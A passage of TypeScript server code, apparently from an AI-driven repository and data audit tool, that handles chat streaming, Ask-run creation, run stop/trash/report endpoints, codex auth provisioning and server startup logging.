      // Read-only access: clone the org's connected repos (Read/Grep/Glob) + mount the read-only data
      // planes (warehouse SELECT / redis read) once per conversation, reused on later turns. Else report-only.
      let cwd: string | undefined; let mcpServers: Record<string, unknown> | undefined; let planeNames: string[] = [];
      try { sse(res, 'status', JSON.stringify({ statusKey: 'preparing' })); } catch { /* client gone */ }
      try { ({ cwd, mcpServers, planeNames } = await resolveChatAccess(tenant, actingOrgId(session!), conv.id)); }
      catch (e) { console.log(JSON.stringify({ severity: 'WARNING', component: 'chat', event: 'access-failed', conv: conv.id, err: e instanceof Error ? e.message : String(e) })); }
      // Per-conversation report context: cache it on the turn that carries the report (the first turn — the
      // dashboard sends the HTML only once), reuse it on later turns so grounding survives without re-uploading
      // the whole report each message.
      if (reportContext) setCachedReportContext(tenant, conv.id, reportContext);
      else reportContext = getCachedReportContext(tenant, conv.id);
      let acc = '';
      // Keepalive. A long tool-heavy turn (repo grep / warehouse queries) streams NO text while tools run, so
      // the SSE connection can stay silent for a minute+ and a browser/proxy may drop it ("network error"). A
      // periodic ping holds the socket open; the client ignores 'working' frames — they just keep bytes flowing.
      const heartbeat = setInterval(() => { try { sse(res, 'status', JSON.stringify({ statusKey: 'working' })); } catch { /* client gone */ } }, 10000);
      let result: Awaited<ReturnType<typeof runChatTurn>>;
      try {
        result = await runChatTurn({
          system: chatSystemPrompt(Boolean(cwd), planeNames),
          user: chatUserPrompt(history, reportContext, message),
          authToken: session!.authToken, model, signal: ac.signal,
          cwd, mcpServers,   // runChatTurn defaults maxTurns (24 with repo/planes, else 1) — no duplicate literal here
          onDelta: (t) => { acc += t; try { sse(res, 'delta', JSON.stringify({ text: t })); } catch { /* client gone */ } },
          onStatus: (k) => { try { sse(res, 'status', JSON.stringify({ statusKey: k })); } catch { /* client gone */ } },
        });
      } finally { clearInterval(heartbeat); }
      if (result.error && !acc.trim()) { updateMessage(conv, asst.id, { text: '(answer interrupted)', partial: false }); try { sse(res, 'error', JSON.stringify({ message: result.error })); } catch { /* client gone */ } }
      else { updateMessage(conv, asst.id, { text: acc, partial: false, usage: result.usage }); try { sse(res, 'done', JSON.stringify({ messageId: asst.id, usage: result.usage })); } catch { /* client gone */ } }
      try { res.end(); } catch { /* client gone */ }
      return;
    }
    if (method === 'POST' && path === '/api/ask') {
      const body = await readBody(req);
      const question = String(body.question || '').trim().slice(0, 16000);
      const scope = String(body.scope || '').trim().slice(0, 200);
      const fixes = Boolean(body.fixes);
      if (!question) return sendJson(res, 400, { error: 'Type a question to ask first.' });
      // accel-mini always invokes Claude — gate on BYO when this instance has no shared key (same as audit).
      if (!apiKeyStatus().ready) return sendJson(res, 400, { error: NO_CLAUDE_KEY });
      // Repo selection from the Ask-tab folded selector ("owner/name" / "owner/name@branch"). EXPLICIT: an empty
      // selection is a data-only ask (no code mounted) — it no longer widens to the acting org's profile repos.
      let askRepos = parseRepoSelection(body.repos, []);
      // Data planes / exec boxes are EXPLICIT per-ask choices, validated with the Full Scan selection validator against
      // the acting org's connected sources (unknown id ⇒ 400; ABSENT ⇒ none, logged). src/run/planeSelection.ts.
      const askPlaneSel = parseAskPlaneSelection(body, sessionWs(session!).sources);
      if (!askPlaneSel.ok) return sendJson(res, 400, { error: askPlaneSel.error });
      // Connected local / uploaded folders — explicit too (absent ⇒ none; non-array or unknown id ⇒ 400).
      const askLocalSel = parseAskLocalFolders(body, sessionWs(session!).sources);
      if (!askLocalSel.ok) return sendJson(res, 400, { error: askLocalSel.error });
      // A short, WORD-BOUNDARY title for the console chrome / run cards (the full question is the report's own H1).
      const title = scope || (question.length <= 72 ? question : question.slice(0, 72).replace(/\s+\S*$/, '').trim() + '…');
      const run: Run = { id: 'ak_' + randomBytes(8).toString('hex'), tenant: session!.tenant, mode: RUN_MODE, kind: 'ask', targetName: title, askQuestion: question, askScope: scope || undefined, askFixes: fixes, askRepos, askLocal: askLocalSel.ids, repoFilter: null, projectFilter: null, status: 'running', log: [], reportHtml: null, findings: 0, costUsd: null, orgId: wsOrg, createdAt: new Date().toISOString(), createdBy: session!.who };
      run.useMemory = body.useMemory !== false;   // per-run "Use org memory" toggle (UI, default ON)
      run.planeFilter = askPlaneSel.planeFilter;   // measurePlanesFor mounts only these
      for (const n of askPlaneSel.notes) pushLog(run, `ⓘ ${n}`);
      if (askPlaneSel.notes.length) console.log(JSON.stringify({ severity: 'WARNING', component: 'run', run: run.id, tenant: run.tenant, event: 'run-request-selection-defaulted', notes: askPlaneSel.notes }));
      pushLog(run, selectionSummary(sessionWs(session!).sources, askPlaneSel, run.useMemory));
      run.writeMemory = body.writeMemory === true; // per-run "Write learnings to memory" tick (UI, default OFF) — gates the write-capable memory MCP for this run
      store.putRun(run);
      liveRun(run).authToken = session!.authToken;   // BYO credential lives in the side-table, never on the run record
      persist();
      executeAskRun(run).catch((e) => failRun(run, String(e)));
      return sendJson(res, 200, { id: run.id });
    }

    // Stop a running run (Recsys Audit / Accel-mini Ask): abort the per-run controller → the next runAgent throws
    // → the executor's failRun/finishRun stop-guards finalize as 'stopped'. Idempotent; acting-org-scoped.
    const stopApi = path.match(/^\/api\/runs\/([^/]+)\/stop$/);
    if (stopApi) {
      if (method !== 'POST') return sendJson(res, 405, { error: 'method not allowed' });
      const run = runInActingOrg(session!, stopApi[1]);   // acting-org-scoped (was raw t.runs.get) — can't stop another org's run
      if (!run) return sendJson(res, 404, { error: 'run not found' });
      // DISPATCHED run: it executes in the Job, not this process — there is NO local AbortController to unwind,
      // and the Job observes cancellation ONLY via the backend cancel_requested_at column (b-3: its cancel-poll reads
      // GET /:id, then aborts and /finishes 'stopped', which dispatchPump terminal-syncs back). So DON'T take EITHER
      // in-process path below — NOT the queued-branch force-'stopped' (which would ORPHAN a Job that already claimed
      // the run during the window before the pump flips local status to 'running') NOR the running-branch abort.
      // Just forward the cancel: set run.cancelRequestedAt + updateRun so the shadow PUT writes cancel_requested_at
      // (b-0 keeps it monotonic on a claimed row, so a later status-flip PUT's null can't clear it). We deliberately
      // do NOT flip the run terminal locally — the Job owns termination (and b-0 ignores a status write on a claimed
      // row). A dispatched run is never terminal here (it's dropped from dispatchedRuns on terminal-sync), so this
      // covers BOTH its local 'queued' (pre-flip) and 'running' (post-flip) states. stopRequested set too (harmless).
      // A QUEUED run hasn't started — there's no worker/abort to unwind, so cancel it directly: mark 'stopped',
      // revert its linked queue item to 'pending' (re-appears in the inbox), then pump() (cancelling a not-yet-
      // running run frees no heavy slot, so pump is a safe no-op, but keeps the terminal-transition contract).
      if (run.status === 'queued') {
        // Keep the run-stop + linked-queue-item revert crash-ATOMIC (one persist), as before: mutate the run in
        // memory, let revertQueueItemToPending's single persist (or our own persist when unlinked) flush BOTH, THEN
        // shadow. (An updateRun here would persist the run alone first → a crash before the queue-item persist could
        // leave stopped-run + still-linked-item, which boot-reconcile doesn't heal.)
        run.status = 'stopped'; run.log.push('stopped by user (canceled before start)');
        persist();
        store.putRun(run);   // fire-and-forget shadow of the stop, AFTER the atomic local persist (no-op under memory mode)
        pumpHeavyRuns();
        return sendJson(res, 200, { ok: true, status: 'stopped' });
      }
      if (run.status !== 'running') return sendJson(res, 200, { ok: true, status: run.status }); // already terminal
      liveRun(run).stopRequested = true; pushLog(run, 'stop requested by user'); liveRun(run).abort?.abort();
      return sendJson(res, 200, { ok: true, status: 'stopping' });
    }
    // Report Trash: soft-delete (reversible) / restore. Trashing also REVOKES any public /share link (a removed
    // report must stop serving publicly). Permanent deletion is the separate /api/trash/empty below.
    const trashApi = path.match(/^\/api\/runs\/([^/]+)\/(trash|restore)$/);
    if (trashApi) {
      if (method !== 'POST') return sendJson(res, 405, { error: 'method not allowed' });
      const run = runInActingOrg(session!, trashApi[1]);   // acting-org-scoped — can't trash/restore another org's run
      if (!run) return sendJson(res, 404, { error: 'run not found' });
      updateRun(run, (r) => {
        if (trashApi[2] === 'trash') { r.trashed = true; r.trashedAt = new Date().toISOString(); }
        else { r.trashed = false; r.trashedAt = undefined; }
      });
      return sendJson(res, 200, { ok: true, trashed: Boolean(run.trashed) });
    }
    // Empty Trash: PERMANENTLY delete every on-disk artifact for each trashed run + drop the run from state.
    if (method === 'POST' && path === '/api/trash/empty') {
      let n = 0;
      for (const run of store.listRunsByTenant(session!.tenant)) { if (!run.trashed) continue; purgeRunArtifacts(run); store.deleteRun(run); n++; }   // liveRun entry is WeakMap-keyed by the run object → GC'd when unreferenced (a still-executing background task keeps its live state, matching pre-refactor behavior)
      persist();
      return sendJson(res, 200, { emptied: n });
    }

    // Per-bundle AREA report (id+bundleId). Its HTML lives only on disk (saveReport), so look it up there.
    // bundleId is restricted to kebab so it can't traverse the report store path.
    const bm = path.match(/^\/api\/runs\/([^/]+)\/bundle\/([a-z0-9-]+)$/);
    if (bm) {
      const run = runInActingOrg(session!, bm[1]); // acting-org-scoped: a session acting as another org can't open this run's area report by direct id
      if (!run) return sendJson(res, 404, { error: 'run not found' });
      const html = loadReport(run.id + '-bundle-' + bm[2]);
      if (!html) return sendJson(res, 404, { error: 'area report not available for this bundle' });
      return sendReportHtml(res, 200, reportForConsole(html, runLinks(run), runScope(run)));
    }

    const m = path.match(/^\/api\/runs\/([^/]+)(\/events|\/report|\/leadership|\/combined|\/workitems|\/provenance|\/trace|\/audit|\/alias|\/title|\/checkpoints)?$/);
    if (m) {
      const run = runInActingOrg(session!, m[1]); // acting-org-scoped: run detail / report / leadership / combined / workitems / trace / audit / checkpoints (view) + alias/title (relabel) — a session acting as another org resolves to undefined → 404
      if (!run) return sendJson(res, 404, { error: 'run not found' });
      // Checkpoint list + resume dry-run: per-cut compatibility against the RUNNING code, and which
      // sources a child run would need live (ref-backed planes rehydrate; session-local ones flag).
      if (m[2] === '/checkpoints') {
        const cks = effectiveCheckpoints(run);   // self-heals the index from the sidecar files (a crash can lose the state.json tail)
        // Contiguity walk (mirrors the POST clamp): the first missing/incompatible non-frontier cut
        // breaks the chain; a later row is still shown but resolves to `effective` = the last
        // contiguous cut, so the UI can preview what a resume from it would ACTUALLY reuse.
        let lastContiguous: CkptId | null = null; let holeHit = false;
        for (const id of CKPT_ORDER) {
          const row = cks.find((c) => c.id === id);
          const ok = row && checkpointCompat(run.id, row).status !== 'incompatible';
          if (ok && !holeHit) { lastContiguous = id; continue; }
          if (id === 'frontier') continue;   // subsumed by 'barrier' — absence is not a hole
          if (row || !ok) holeHit = true;    // an existing-but-broken row, or a gap before later rows
        }
        const rows = cks.map((c) => {
          const compat = checkpointCompat(run.id, c);
          const effective = (lastContiguous && ckptRank(c.id) > ckptRank(lastContiguous)) ? lastContiguous : c.id;
          return { id: c.id, label: c.label, detail: c.detail, at: c.at, bytes: c.bytes, spentUsd: c.spentUsd, bundlesDone: c.bundlesDone,
            compat: compat.status, compatWhy: compat.why, effective, resumable: c.id !== 'combined' && compat.status !== 'incompatible' };
        });
        const srcs = ws!.sources;
        const ghSrc = srcs.find((s) => s.kind === 'github');
        // Planes the PARENT actually mounted (recorded on its comprehend cut, by CONCRETE coordinate
        // fingerprint) that would no longer resolve — the resume dry-run must surface these even though
        // they're absent from (or replaced in) the current source list (otherwise a
        // disconnected warehouse just disappears — or a swapped staging one passes — and a re-running
        // lane silently measures the wrong plane).
        const recordedPlanes = ((loadCheckpoint(run.id, 'comprehend')?.payload?.planes ?? []) as { kind: string; serverName: string; fp: string }[]);
        const liveFps = new Set(measurePlaneIdentities([...srcs, ...envMcpSources()]).map((p) => p.fp));
        const reconnects = [
          { key: 'claude', label: 'Anthropic key', need: 'always' as const, ok: apiKeyStatus().ready, detail: apiKeyStatus().ready ? 'configured' : 'add your Anthropic API key in Settings' },
          ...(run.repoFilter?.length ? [{ key: 'github', label: 'GitHub', need: 'always' as const, ok: Boolean(ghSrc && ghSrc.status === 'ready'), detail: 'rebuild workspace @ pinned SHAs' }] : []),
          // Measurement planes are only needed when a stage that MEASURES re-runs (lanes / claim-audit
          // re-verify) — i.e. resuming at or before the barrier. The UI keys this on `need: 'early'`.
          ...srcs.filter((s) => ['warehouse', 'keyvalue', 'analytics', 'bi', 'custom'].includes(s.kind)).map((s) => (
            { key: s.kind + ':' + s.id, label: s.name, need: 'early' as const, ok: s.status === 'ready', detail: s.status === 'ready' ? 'connected' : s.detail })),
          ...recordedPlanes.filter((p) => !liveFps.has(p.fp)).map((p) => (
            { key: 'plane:' + p.fp, label: `${p.serverName} (${p.kind}) — used by this run`, need: 'early' as const, ok: false, detail: 'this exact plane was mounted when this run measured — reconnect the same coordinates to re-run measuring stages' })),
        ];
        return sendJson(res, 200, { runId: run.id, alias: run.alias ?? null, checkpoints: rows, reconnects });
      }
      // Set/clear a human alias for the run. Display-only label — the rs_… id stays the unique key everywhere.
      if (method === 'POST' && m[2] === '/alias') {
        const body = await readBody(req);
        const a = String(body?.alias ?? '').trim().slice(0, 120);
        updateRun(run, (r) => { r.alias = a || undefined; });   // blank clears it — funnelled through the Store so alias shadows
        return sendJson(res, 200, { ok: true, alias: run.alias ?? null });
      }
      // Set/clear a user-edited run TITLE (run.renamed). Distinct from /alias (which relabels the id):
      // this overrides the displayed title (runTitle). Blank CLEARS it, reverting to the generated/target title.
      if (method === 'POST' && m[2] === '/title') {
        const body = await readBody(req);
        const raw = String(body?.title ?? '').trim().slice(0, 200);
        updateRun(run, (r) => { r.renamed = raw || undefined; });   // blank clears the override — funnelled through the Store
        return sendJson(res, 200, { ok: true, renamed: run.renamed ?? null });
      }
      if (m[2] === '/events') {
        res.writeHead(200, { 'content-type': 'text/event-stream', 'cache-control': 'no-cache', connection: 'keep-alive' });
        // Replay the backlog, each line carrying its recorded epoch-ms as the SSE id (empty for pre-existing runs
        // with no logTimes → the UI just shows no timestamp for those). Live tail (pushLog) carries it the same way.
        run.log.forEach((line, i) => sse(res, 'log', line, run.logTimes?.[i] ?? ''));
        if (run.status === 'complete') { sse(res, 'done', JSON.stringify({ findings: run.findings, costUsd: run.costUsd })); return res.end(); }
        if (run.status === 'error') { sse(res, 'error', JSON.stringify({ error: run.error })); return res.end(); }
        // A QUEUED run has no worker and no live output yet — do NOT hold the SSE open (it would hang until the
        // promoter promotes it). Emit a 'queued' event and close; the client re-attaches once /api/state shows
        // the run flipped to 'running'.
        if (run.status === 'queued') { sse(res, 'queued', JSON.stringify({ queued: true })); return res.end(); }
        // heartbeat: a long agentic run can idle between log lines; a periodic comment
        // ping keeps reverse proxies from dropping the SSE stream.
        const ping = setInterval(() => { try { res.write(':\n\n'); } catch { /* closed */ } }, 25_000);
        liveRun(run).subs.add(res);
        req.on('close', () => { clearInterval(ping); liveRun(run).subs.delete(res); });
        return;
      }
      if (m[2] === '/report') { const html = run.reportHtml ?? loadReport(run.id); if (!html) return sendJson(res, 404, { error: 'report not ready' }); return sendReportHtml(res, 200, reportForConsole(html, runLinks(run), runScope(run))); }
      // The second, LEADERSHIP report (deep-brief brief) — self-contained HTML with its OWN header
      // (reportForConsole only hides `#repTopbar`). 404 for deterministic/older runs that produced no leadership report.
      if (m[2] === '/leadership') { const html = run.leadershipHtml ?? loadReport(run.id + '-leadership'); if (!html) return sendJson(res, 404, { error: 'leadership report not available for this run' }); return sendReportHtml(res, 200, reportForConsole(html, runLinks(run), runScope(run))); }
      // The COMBINED report (Report Normalizer): leadership + every area report merged into one tabbed, self-contained
      // deliverable with its OWN unified header. On disk via saveReport(id+'-combined'). 404 for runs
      // that produced no combined (deterministic runs, single-report runs, or a merge that failed the content gate).
      // A Combined report stored before the findings index existed gets one back-filled from the run's engineering
      // report (backfillFindingsIndex — a no-op when the stored document already carries its index).
      if (m[2] === '/combined') { const html = run.combinedHtml ?? loadReport(run.id + '-combined'); if (!html) return sendJson(res, 404, { error: 'combined report not available for this run' }); const withIndex = backfillFindingsIndex(html, html.includes('<!--findings-index-->') ? null : (run.reportHtml ?? loadReport(run.id)), { engineeringUrl: engineeringReportUrl(run.id) }); return sendReportHtml(res, 200, reportForConsole(withIndex, runLinks(run), runScope(run))); }
      // The DEDICATED eng-facing work-item report (item→location→context) — a standalone deliverable.
      // On disk only (saveReport). 404 for runs that produced no work items.
      if (m[2] === '/workitems') { const html = loadReport(run.id + '-workitems'); if (!html) return sendJson(res, 404, { error: 'work-item report not available for this run' }); return sendReportHtml(res, 200, reportForConsole(html, runLinks(run), runScope(run))); }
      if (m[2] === '/provenance') { const html = loadReport(run.id + '-provenance'); if (!html) return sendJson(res, 404, { error: 'provenance report not available for this run' }); return sendReportHtml(res, 200, reportForConsole(html, runLinks(run), runScope(run))); }   // Evidence permalinks like every other report route
      // Merged agent trajectory + tool tally (tenant-scoped lookup above → no cross-tenant access; NOT
      // reachable via /share, which only serves the final report). Self-contained HTML.
      if (m[2] === '/trace') { const html = loadReport(run.id + '-trace'); if (!html) return sendJson(res, 404, { error: 'run trace not available for this run' }); return sendReportHtml(res, 200, reportForConsole(html)); }
      // Per-node AUDIT-LOG flight recorder (tenant-scoped lookup above; NOT reachable via /share). Self-contained HTML.
      if (m[2] === '/audit') { const html = loadReport(run.id + '-audit'); if (!html) return sendJson(res, 404, { error: 'run audit log not available for this run' }); return sendReportHtml(res, 200, reportForConsole(html)); }
      return sendJson(res, 200, { id: run.id, status: run.status, findings: run.findings, costUsd: run.costUsd, hasLeadership: Boolean(run.leadershipHtml || loadReport(run.id + '-leadership')) });
    }

    sendJson(res, 404, { error: 'not found' });
  } catch (e) {
    sendJson(res, 500, { error: e instanceof Error ? e.message : String(e) });
  }
});

// The Docker image ships the codex CLI but with no ~/.codex — provision auth.json from OPENAI_API_KEY (the
// SAME key gpt-5.5 uses, apikey mode) so the Report Normalizer's codex writer runs in the container. Without this the
// normalizer falls back to the Claude Agent SDK writer, which can't author the ~500KB merged file → no Combined report.
// codex reads auth from CODEX_HOME (a Dockerfile ENV; scrubbedEnv keeps CODEX_HOME). fail-open; the key is never logged.
// Boot-probe result for OPENAI_API_KEY: true = authenticated · false = rejected (401/403) · undefined = no key /
// not yet probed / inconclusive. Read by /api/state (openaiAuthOk) and finishRun (degradation row).
let openaiAuthOk: boolean | undefined;
function provisionCodexAuth(): void {
  try {
    const key = process.env.OPENAI_API_KEY; const home = process.env.CODEX_HOME;
    if (!key || !home) return;   // only when explicitly pointed at a codex home (Dockerfile sets it; local default ~/.codex has no CODEX_HOME → no-op)
    const authPath = join(home, 'auth.json');
    if (existsSync(authPath)) return;   // NEVER clobber an existing codex login (a real ChatGPT/OAuth cache); only create when missing
    mkdirSync(home, { recursive: true, mode: 0o700 });
    writeFileSync(authPath, JSON.stringify({ auth_mode: 'apikey', OPENAI_API_KEY: key }), { mode: 0o600 });
    console.log(JSON.stringify({ severity: 'INFO', component: 'boot', event: 'codex-auth-provisioned', codexHome: home }));
  } catch (e) { console.log(JSON.stringify({ severity: 'WARNING', component: 'boot', event: 'codex-auth-failed', error: e instanceof Error ? e.message : String(e) })); }
}

provisionCodexAuth();
// One-shot OpenAI key probe (a models listing — no tokens billed). A rejected key made every codex/gpt
// stage fall open silently; now the boot log says so, /api/state carries `openaiAuthOk` for the console
// banner, and finishRun records an 'openai-auth' degradation on each run. Fire-and-forget: never delays boot; an
// inconclusive probe (network / 5xx) leaves the flag undefined — never reported as a bad key.
if (process.env.OPENAI_API_KEY) {
  void probeOpenAiAuth().then((p) => {
    openaiAuthOk = p.ok;
    if (p.ok === false) console.log(JSON.stringify({ severity: 'ERROR', component: 'boot', event: 'openai-auth-failed', status: p.status, detail: 'OPENAI_API_KEY was rejected by the OpenAI API — codex/gpt report stages will run degraded (fail-open). Rotate the key.' }));
    else if (p.ok === true) console.log(JSON.stringify({ severity: 'INFO', component: 'boot', event: 'openai-auth-ok' }));
    else console.log(JSON.stringify({ severity: 'WARNING', component: 'boot', event: 'openai-auth-inconclusive', status: p.status, error: p.error }));
  });
}
ensureStore();
await restore();
// Interim resilience (pending backend-IdP migration): sessions live only in this instance's
// in-memory map, so a crash/restart logs out EVERY user. Until sessions are durable, swallow
// stray async errors (log them for diagnosis) rather than let Node's default kill the process.
// NOTE: once sessions are durable, flip uncaughtException to log-then-process.exit(1) (standard posture).
process.on('unhandledRejection', (reason) => {
  console.log(JSON.stringify({ severity: 'ERROR', component: 'process', event: 'unhandled-rejection',
    error: reason instanceof Error ? reason.message : String(reason),
    stack: reason instanceof Error ? reason.stack : undefined }));
});
process.on('uncaughtException', (err) => {
  console.log(JSON.stringify({ severity: 'ERROR', component: 'process', event: 'uncaught-exception',
    error: err instanceof Error ? err.message : String(err),
    stack: err instanceof Error ? err.stack : undefined }));
});
server.listen(PORT, HOST, () => {
  const keys = apiKeyStatus();
  console.log(`▶ Waggle ${APP_VERSION} → ${BASE_URL}`);
  console.log(`  data: ${dataDir()} · runs restored: ${[...store.allRuns()].length} · per-run cap: $${runBudget()}`);
  console.log(`  keys: Anthropic ${keys.anthropic.set ? 'set (' + keys.anthropic.source + ')' : keys.claudeLogin ? 'not set — using the local claude login' : 'NOT SET — add it in Settings → API keys'} · OpenAI ${keys.openai.set ? 'set (' + keys.openai.source + ')' : 'not set (optional)'}`);
  const tel = telemetryStatus();
  console.log(`  telemetry: ${tel.enabled ? 'on (anonymous usage counts; THERESA_TELEMETRY=0 or Settings to turn off; --print-telemetry shows each payload)' : 'off'}`);
  if (HOST !== '127.0.0.1' && HOST !== 'localhost' && HOST !== '::1') console.warn(existsSync('/.dockerenv')
    ? `  ⓘ in a container, listening on ${HOST}:${PORT}. The console has no login — publish the port on the host's loopback only (docker run -p 127.0.0.1:${PORT}:${PORT} …).`
    : `  ⚠ listening on ${HOST}: the console has no login — anyone who can reach this port can use it and your API keys.`);
  if (codeintelEnabled()) console.log('  code intelligence: on (repowise subprocess indexes each scanned workspace)');
  if (process.env.THERESA_OSV === '1') console.log('  OSV: on for private code (THERESA_OSV=1 — package coordinates are posted to api.osv.dev)');
  if (tel.enabled && tel.noticeShown) track('start', {});   // only after the first-run notice has been shown in the console
});
